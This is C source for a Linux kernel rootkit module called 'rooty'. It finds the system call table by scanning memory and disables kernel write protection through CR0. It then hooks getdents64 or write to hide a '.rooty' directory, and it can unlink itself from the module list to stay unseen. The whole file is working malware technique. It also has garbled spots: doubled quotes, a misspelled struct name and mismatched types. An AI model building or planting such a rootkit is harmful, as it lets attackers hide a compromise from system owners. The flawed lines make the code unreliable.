void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK	0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK	0xffffffff81000000
#define END_CHECK	0xffffffffa2000000
typedef unsigned long psize;
#endif


psize *sys_call_table;
asmlinkage ssize_t (*o_write)(int fd, char *buff, ssize_t count);
asmlinkage int (*o_getdents64)(unsigned int fd, 
	struct linux_dirent *dirent,unsigned int count);

psize **find(void)
{
	psize **sctable;
	psize i = START_CHECK;
	while (i < END_CHECK)
	{
		sctable = (psize **)i;
		if (sctable[__NR_close] == (psize *)sys_close)
		{
			return &sctable[0];
		}
		i += sizeof(void *);
	}

	return NULL;
}

asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count)
{
	ssize_t ret;
	char *proc_protect = "".rooty""; /* The name of the directory to protect */
	char *kbuff = (char *)kmalloc(256, GFP_KERNEL);
	char *pos;

	copy_from_user(kbuff, buff, 255);

	if (strstr(kbuff, proc_protect))
	{
		kfree(kbuff);
		return EEXIST;
	}

	ret = o_write(fd, buff, count);
	kfree(kbuff);

	return ret;
}


asmlinkage int rooty_getdents64(unsigned int fd, 
	struct linux_dirent64 *dirp, unsigned int count)
{
	int ret = o_getdents64(fd, dirp, count);
	int pos;
	struct linux_dirent64 *d, *prev = NULL;
	char *kbuff = kmalloc(256, GFP_KERNEL);

	for (pos = 0 ; pos < ret-1 ; )
	{
		d = (struct inux_dirent64 *)((char *)dirp + pos);
		copy_from_user(kbuff, d->d_name, 255);

		if (strcmp(kbuff, "".rooty"") == 0)
		{
			if (prev == NULL)
			{
				kfree(kbuff);
				*dirp = *(struct linux_dirent64 *)((char *)d + d->d_reclen);
				return ret - d->d_reclen;
			}
			else
			{
				prev->d_reclen += d->d_reclen;
				break;
			}
		}

		pos += d->d_reclen;
		prev = d;
	}
	return ret;
}

int rooty_init(void)
{
/*	To hide the module */
#ifdef INVISIBLE_MODULE
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
#endif

	if ((sys_call_table = (psize *)find()) != NULL)
		printk(""rooty : sys_call_table found at %p\n"", sys_call_table);
	else
		printk(""rooty : sys_call_table not found\n"");

	write_cr0(read_cr0() & (~0x10000));

#ifdef HIJACK_WRITE
	o_write = (void *)xchg(&sys_call_table[__NR_write], rooty_write);
#else
	o_getdents64 = (void *)xchg(&sys_call_table[__NR_getdents64], rooty_getdents64);
#endif

	write_cr0(read_cr0() | 0x10000);

	return 0;
}

void rooty_exit(void)
{
	write_cr0(read_cr0() & (~0x10000));

#ifdef HIJACK_WRITE
	xchg(&sys_call_table[__NR_write], o_write);
#else
	xchg(&sys_call_table[__NR_getdents64], o_getdents64);
#endif

	write_cr0(read_cr0() | 0x10000);
	printk(""rooty : module removed\n"");
}"
